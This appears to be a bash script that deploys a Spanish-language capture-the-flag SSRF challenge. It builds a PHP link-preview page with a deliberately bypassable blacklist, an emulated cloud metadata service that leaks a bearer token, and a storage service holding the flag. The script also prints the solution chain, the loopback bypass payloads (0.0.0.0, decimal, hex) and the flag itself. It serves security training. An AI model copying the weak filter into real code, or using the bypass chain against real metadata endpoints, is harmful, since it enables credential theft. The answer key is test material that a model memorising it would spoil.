#!/bin/bash
# =============================================================================
# CTF MGP - RETO 5: SSRF con bypass de filtros (Avanzado)
# Puerto: 80/ssrf/  +  Flask metadata :8888  +  storage :9999
# Sin DB  |  Flag: Comciberdef{ssrf_bypass_2026_master}
#
# Cadena de explotación:
#   1. Identificar SSRF en /ssrf/preview.php?url=
#   2. localhost y 127.0.0.1 bloqueados — usar bypass (0.0.0.0 / decimal / hex)
#   3. Alcanzar http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role
#   4. Obtener el Bearer token
#   5. Hacer SSRF al storage: http://0.0.0.0:9999/secret/flag.txt
#      con cabecera Authorization: Bearer <TOKEN>
# =============================================================================
set -e

VERDE="\e[32m"
AMARILLO="\e[33m"
ROJO="\e[31m"
RESET="\e[0m"

echo -e "${VERDE}[*] RETO 5 — SSRF: iniciando despliegue...${RESET}"

# -----------------------------------------------------------------------------
# 1. Dependencias — Python3 + Flask para los servicios internos
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Instalando Python3-Flask...${RESET}"
apt-get install -y -qq python3 python3-pip
pip3 install flask --quiet
echo -e "${VERDE}    [OK] Flask instalado${RESET}"

# -----------------------------------------------------------------------------
# 2. Token secreto (generado una sola vez, hardcodeado en ambos servicios)
# -----------------------------------------------------------------------------
SECRET_TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"

# -----------------------------------------------------------------------------
# 3. Servicio Flask A — Emulador de Metadata (puerto 8888)
#    Solo escucha en 0.0.0.0 — accesible desde localhost via SSRF
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Creando servicio de metadata (Flask :8888)...${RESET}"
mkdir -p /opt/ctf-ssrf

cat > /opt/ctf-ssrf/metadata_service.py <<PYEOF
#!/usr/bin/env python3
"""
Emulador de servicio de metadata tipo AWS IMDSv1
Escucha en 0.0.0.0:8888 — accesible solo via SSRF desde la app web
"""
from flask import Flask, request, jsonify, Response
import datetime

app = Flask(__name__)
SECRET_TOKEN = "$SECRET_TOKEN"

@app.route('/')
def index():
    return Response(
        "Metadata Service v1.0\n"
        "latest/\n"
        "  meta-data/\n"
        "    iam/\n"
        "      security-credentials/\n",
        mimetype='text/plain'
    )

@app.route('/latest/meta-data/')
def meta_data():
    return Response(
        "ami-id\ninstance-id\niam/\nlocal-ipv4\n",
        mimetype='text/plain'
    )

@app.route('/latest/meta-data/iam/')
def iam():
    return Response("security-credentials/\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/security-credentials/')
def creds_list():
    return Response("mgp-role\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/security-credentials/mgp-role')
def creds():
    """Endpoint objetivo — devuelve el token"""
    return jsonify({
        "Code": "Success",
        "LastUpdated": datetime.datetime.utcnow().isoformat() + "Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIAMGP2026EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": SECRET_TOKEN,
        "Expiration": "2026-12-31T23:59:59Z",
        "RoleArn": "arn:aws:iam::123456789012:role/mgp-internal-role",
        "Note": "Usa el campo Token como Bearer en el servicio de storage interno"
    })

@app.route('/latest/meta-data/local-ipv4')
def local_ip():
    return Response("192.168.125.150\n", mimetype='text/plain')

@app.route('/latest/meta-data/instance-id')
def instance_id():
    return Response("i-mgp-ctf-2026-server\n", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
PYEOF

# -----------------------------------------------------------------------------
# 4. Servicio Flask B — Storage interno (puerto 9999)
#    Requiere Authorization: Bearer <TOKEN> para entregar la flag
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Creando servicio de storage (Flask :9999)...${RESET}"

cat > /opt/ctf-ssrf/storage_service.py <<PYEOF
#!/usr/bin/env python3
"""
Servicio de almacenamiento interno — requiere Bearer token del metadata service
Escucha en 0.0.0.0:9999
"""
from flask import Flask, request, Response, jsonify

app = Flask(__name__)
SECRET_TOKEN = "$SECRET_TOKEN"
FLAG = "Comciberdef{ssrf_bypass_2026_master}"

@app.route('/')
def index():
    return Response(
        "Internal Storage Service\n"
        "Endpoints:\n"
        "  /secret/flag.txt   [AUTH REQUIRED]\n"
        "  /public/readme.txt [PUBLIC]\n",
        mimetype='text/plain'
    )

@app.route('/public/readme.txt')
def readme():
    return Response(
        "Sistema de almacenamiento interno COMCIBERDEF.\n"
        "Acceso a recursos clasificados requiere token IAM válido.\n"
        "Contacto: sistemas@comciberdef.mil.pe\n",
        mimetype='text/plain'
    )

@app.route('/secret/flag.txt')
def flag():
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer '):
        return Response(
            "401 Unauthorized\n"
            "Se requiere Authorization: Bearer <token>\n"
            "Obtén el token desde el servicio de metadata interno.\n",
            status=401, mimetype='text/plain'
        )
    token = auth.replace('Bearer ', '').strip()
    if token != SECRET_TOKEN:
        return Response(
            "403 Forbidden\nToken inválido o expirado.\n",
            status=403, mimetype='text/plain'
        )
    return Response(
        "=== DOCUMENTO CLASIFICADO ===\n\n"
        + FLAG + "\n\n"
        "Acceso registrado: " + request.remote_addr + "\n",
        mimetype='text/plain'
    )

@app.route('/secret/')
def secret_index():
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer ') or \
       auth.replace('Bearer ','').strip() != SECRET_TOKEN:
        return Response("401 Unauthorized\n", status=401, mimetype='text/plain')
    return Response("flag.txt\n", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999, debug=False)
PYEOF

chmod +x /opt/ctf-ssrf/metadata_service.py
chmod +x /opt/ctf-ssrf/storage_service.py
echo -e "${VERDE}    [OK] Servicios Flask creados${RESET}"

# -----------------------------------------------------------------------------
# 5. Servicios systemd para ambos Flask
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Registrando servicios systemd...${RESET}"

cat > /etc/systemd/system/ctf-metadata.service <<'SVCEOF'
[Unit]
Description=CTF SSRF — Metadata Service (puerto 8888)
After=network.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/ctf-ssrf
ExecStart=/usr/bin/python3 /opt/ctf-ssrf/metadata_service.py
Restart=always
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SVCEOF

cat > /etc/systemd/system/ctf-storage.service <<'SVCEOF'
[Unit]
Description=CTF SSRF — Storage Service (puerto 9999)
After=network.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/opt/ctf-ssrf
ExecStart=/usr/bin/python3 /opt/ctf-ssrf/storage_service.py
Restart=always
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable ctf-metadata ctf-storage
systemctl start  ctf-metadata ctf-storage
sleep 2
echo -e "${VERDE}    [OK] Servicios systemd activos${RESET}"

# -----------------------------------------------------------------------------
# 6. Reglas iptables — bloquear acceso DIRECTO externo a 8888 y 9999
#    Solo accesibles desde localhost (via SSRF desde la app PHP)
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Aplicando reglas iptables (8888 y 9999 solo desde localhost)...${RESET}"

# Permitir tráfico desde localhost (loopback)
iptables -I INPUT -i lo -p tcp --dport 8888 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -i lo -p tcp --dport 9999 -j ACCEPT 2>/dev/null || true

# Bloquear tráfico externo a 8888 y 9999
iptables -A INPUT -p tcp --dport 8888 ! -i lo -j DROP 2>/dev/null || true
iptables -A INPUT -p tcp --dport 9999 ! -i lo -j DROP 2>/dev/null || true

# Guardar reglas
if command -v iptables-save &>/dev/null; then
    mkdir -p /etc/iptables
    iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
fi
echo -e "${VERDE}    [OK] Puertos 8888 y 9999 solo accesibles desde localhost${RESET}"

# -----------------------------------------------------------------------------
# 7. Aplicación PHP vulnerable a SSRF (proxy de URLs)
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Desplegando portal SSRF...${RESET}"
mkdir -p /var/www/html/ssrf

# ---------- index.php — portal de preview de enlaces ----------
cat > /var/www/html/ssrf/index.php <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NavalConnect — Previsualizador de Recursos</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',sans-serif;min-height:100vh}
  header{background:#1e293b;border-bottom:1px solid #334155;
         padding:16px 36px;display:flex;align-items:center;gap:14px}
  header h1{font-size:20px;color:#38bdf8;font-weight:700;letter-spacing:1px}
  header p{font-size:12px;color:#64748b;margin-left:auto}
  .container{max-width:820px;margin:48px auto;padding:0 24px}
  .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:36px}
  h2{font-size:18px;margin-bottom:8px;color:#f1f5f9}
  .desc{font-size:13px;color:#64748b;margin-bottom:28px;line-height:1.6}
  .form-row{display:flex;gap:0}
  .form-row input{flex:1;background:#0f172a;border:1px solid #334155;border-radius:8px 0 0 8px;
                  padding:12px 16px;color:#e2e8f0;font-size:14px;outline:none;transition:.2s}
  .form-row input:focus{border-color:#38bdf8}
  .form-row button{padding:12px 24px;background:#0284c7;color:#fff;
                   border:none;border-radius:0 8px 8px 0;cursor:pointer;
                   font-size:14px;font-weight:600;transition:.2s}
  .form-row button:hover{background:#0369a1}
  .examples{margin-top:20px}
  .examples h3{font-size:12px;text-transform:uppercase;letter-spacing:1px;
               color:#64748b;margin-bottom:10px}
  .tag{display:inline-block;background:#0f172a;border:1px solid #334155;
       border-radius:20px;padding:4px 12px;font-size:12px;color:#94a3b8;
       margin:3px;cursor:pointer;transition:.15s}
  .tag:hover{border-color:#38bdf8;color:#38bdf8}
  .notice{margin-top:24px;background:#1e3a5f;border:1px solid #1e40af;
          border-radius:8px;padding:14px 18px;font-size:12px;color:#93c5fd}
  .footer{text-align:center;margin-top:40px;font-size:11px;color:#475569}
</style>
</head>
<body>
<header>
  <h1>&#127758; NavalConnect</h1>
  <p>Red Social Interna — Previsualizador de Recursos v1.4.2</p>
</header>
<div class="container">
  <div class="card">
    <h2>Previsualizar recurso externo</h2>
    <p class="desc">
      Pega la URL de cualquier recurso accesible para obtener una vista previa
      de su contenido. Útil para compartir enlaces internos entre equipos.
    </p>
    <form action="preview.php" method="GET">
      <div class="form-row">
        <input type="text" name="url" placeholder="https://recurso.ejemplo.com/documento" required>
        <button type="submit">&#128269; Previsualizar</button>
      </div>
    </form>
    <div class="examples">
      <h3>Ejemplos</h3>
      <span class="tag" onclick="this.closest('form')??document.querySelector('input[name=url]').value=this.textContent">
        http://192.168.125.150/ssrf/public/info.txt
      </span>
    </div>
    <div class="notice">
      <strong>Aviso de seguridad:</strong> Este servicio bloquea el acceso a direcciones
      IP locales (localhost, 127.0.0.1, 192.168.x.x) por razones de seguridad.
      Solo se permiten recursos externos verificados.
    </div>
  </div>
  <div class="footer">NavalConnect &copy; 2026 — COMCIBERDEF Internal Network</div>
</div>
</body>
</html>
PHPEOF

# ---------- preview.php — VULNERABLE a SSRF con filtro bypasseable ----------
cat > /var/www/html/ssrf/preview.php <<'PHPEOF'
<?php
$url = $_GET['url'] ?? '';

// *** FILTRO DÉBIL — bypasseable con 0.0.0.0, decimal, hex ***
$blacklist = ['localhost', '127.0.0.1', '::1', '192.168.', '10.', '172.16.', '172.17.'];
$blocked   = false;
foreach ($blacklist as $blocked_str) {
    if (stripos($url, $blocked_str) !== false) {
        $blocked = true;
        break;
    }
}

$result  = '';
$error   = '';
$success = false;

if ($url && !$blocked) {
    // SSRF: curl sin restricción de esquema/host real
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
    curl_setopt($ch, CURLOPT_USERAGENT, 'NavalConnect-Preview/1.4.2');
    // Permite pasar cabeceras personalizadas (necesario para Bearer token)
    if (isset($_GET['headers']) && is_array($_GET['headers'])) {
        $hdr = [];
        foreach ($_GET['headers'] as $k => $v) {
            $hdr[] = htmlspecialchars_decode($k) . ': ' . htmlspecialchars_decode($v);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $hdr);
    }
    $result  = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($result !== false && $http_code > 0) {
        $success = true;
    } else {
        $error = $curl_error ?: 'No se pudo conectar al recurso indicado.';
    }
} elseif ($blocked) {
    $error = 'Acceso denegado: la URL apunta a una dirección IP interna bloqueada por política de seguridad.';
} else {
    $error = 'URL no válida.';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>NavalConnect — Vista Previa</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',sans-serif;min-height:100vh}
  header{background:#1e293b;border-bottom:1px solid #334155;
         padding:16px 36px;display:flex;align-items:center;gap:14px}
  header h1{font-size:20px;color:#38bdf8;font-weight:700}
  header a{margin-left:auto;color:#64748b;font-size:13px;text-decoration:none}
  .container{max-width:820px;margin:40px auto;padding:0 24px}
  .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:28px}
  .url-display{font-size:12px;color:#64748b;margin-bottom:20px;
               background:#0f172a;padding:10px 14px;border-radius:6px;
               font-family:monospace;word-break:break-all}
  .result-box{background:#0f172a;border:1px solid #1e40af;border-radius:8px;
              padding:20px;font-family:monospace;font-size:13px;
              color:#93c5fd;white-space:pre-wrap;word-break:break-all;
              max-height:500px;overflow-y:auto;line-height:1.6}
  .error-box{background:#1e1414;border:1px solid #7f1d1d;border-radius:8px;
             padding:20px;color:#fca5a5;font-size:14px}
  .status-ok{color:#34d399;font-size:13px;margin-bottom:14px}
  .status-err{color:#f87171;font-size:13px;margin-bottom:14px}
  .back{display:inline-block;margin-top:20px;color:#38bdf8;font-size:13px;text-decoration:none}
  .hint-box{background:#1e2d1e;border:1px solid #166534;border-radius:8px;
            padding:14px 18px;font-size:12px;color:#86efac;margin-top:20px}
</style>
</head>
<body>
<header>
  <h1>&#127758; NavalConnect — Vista Previa</h1>
  <a href="index.php">&#8592; Volver</a>
</header>
<div class="container">
  <div class="card">
    <div class="url-display">URL: <?= htmlspecialchars($url) ?></div>

    <?php if ($success): ?>
      <div class="status-ok">&#10003; Recurso obtenido correctamente</div>
      <div class="result-box"><?= htmlspecialchars($result) ?></div>
      <?php if (isset($http_code) && $http_code == 401): ?>
      <div class="hint-box">
        <strong>Tip:</strong> Este recurso requiere autenticación.
        Puedes pasar cabeceras usando <code>?url=...&amp;headers[Authorization]=Bearer+TOKEN</code>
      </div>
      <?php endif; ?>

    <?php else: ?>
      <div class="status-err">&#10007; Error al obtener el recurso</div>
      <div class="error-box"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <a class="back" href="index.php">&#8592; Nueva previsualización</a>
  </div>
</div>
</body>
</html>
PHPEOF

# Archivo público de referencia
mkdir -p /var/www/html/ssrf/public
cat > /var/www/html/ssrf/public/info.txt <<'TXTEOF'
NavalConnect — Servicio de Previsualización de Recursos
=======================================================
Este servicio permite previsualizar el contenido de URLs externas.

Arquitectura interna:
- Servicio web principal:   192.168.125.150:80/ssrf/
- Documentación pública:    /ssrf/public/
- Recursos clasificados:    Solo accesibles desde la red interna

Nota: La infraestructura de identidad sigue estándares de nube corporativa.
TXTEOF

# Permisos
chown -R www-data:www-data /var/www/html/ssrf
chmod -R 750 /var/www/html/ssrf

echo -e "${VERDE}    [OK] Portal SSRF desplegado${RESET}"

# -----------------------------------------------------------------------------
# 8. Verificación completa de la cadena SSRF
# -----------------------------------------------------------------------------
echo -e "${AMARILLO}[+] Verificando cadena SSRF...${RESET}"
sleep 2

# Test 1: metadata accesible desde localhost
META_TEST=$(curl -s "http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" 2>/dev/null | grep -c "Token" || true)
if [ "$META_TEST" -gt 0 ]; then
    echo -e "${VERDE}    [OK] Metadata service responde correctamente${RESET}"
else
    echo -e "${ROJO}    [ERROR] Metadata service no responde — verificar ctf-metadata.service${RESET}"
fi

# Test 2: storage requiere token
STOR_401=$(curl -s -o /dev/null -w "%{http_code}" "http://0.0.0.0:9999/secret/flag.txt" 2>/dev/null || echo "000")
if [ "$STOR_401" = "401" ]; then
    echo -e "${VERDE}    [OK] Storage exige autenticación (401)${RESET}"
else
    echo -e "${ROJO}    [ERROR] Storage respondió $STOR_401 en lugar de 401${RESET}"
fi

# Test 3: storage entrega flag con token correcto
STOR_FLAG=$(curl -s -H "Authorization: Bearer $SECRET_TOKEN" \
    "http://0.0.0.0:9999/secret/flag.txt" 2>/dev/null | grep -c "Comciberdef" || true)
if [ "$STOR_FLAG" -gt 0 ]; then
    echo -e "${VERDE}    [OK] Flag entregada con token correcto${RESET}"
else
    echo -e "${ROJO}    [ERROR] Flag no entregada — verificar storage service${RESET}"
fi

# Test 4: SSRF via app web con bypass (0.0.0.0)
SSRF_BYPASS=$(curl -s "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" 2>/dev/null | grep -c "Token" || true)
if [ "$SSRF_BYPASS" -gt 0 ]; then
    echo -e "${VERDE}    [OK] Bypass SSRF funciona con 0.0.0.0${RESET}"
else
    echo -e "${AMARILLO}    [INFO] Verificar bypass SSRF manualmente${RESET}"
fi

echo ""
echo -e "${VERDE}============================================================${RESET}"
echo -e "${VERDE} RETO 5 - SSRF DESPLEGADO${RESET}"
echo -e "${VERDE}============================================================${RESET}"
echo -e " URL:         http://192.168.125.150/ssrf/"
echo -e " Flag:        Comciberdef{ssrf_bypass_2026_master}"
echo -e " Token:       $SECRET_TOKEN"
echo -e " Cadena:"
echo -e "   1. SSRF básico (bloqueado): ?url=http://localhost:8888/..."
echo -e "   2. Bypass: ?url=http://0.0.0.0:8888/latest/meta-data/iam/"
echo -e "              /security-credentials/mgp-role"
echo -e "   3. Extraer Token del JSON"
echo -e "   4. Storage: ?url=http://0.0.0.0:9999/secret/flag.txt"
echo -e "               &headers[Authorization]=Bearer+TOKEN"
echo -e " Otros bypasses: 2130706433 (decimal) / 0x7f000001 (hex)"
echo -e "${VERDE}============================================================${RESET}"
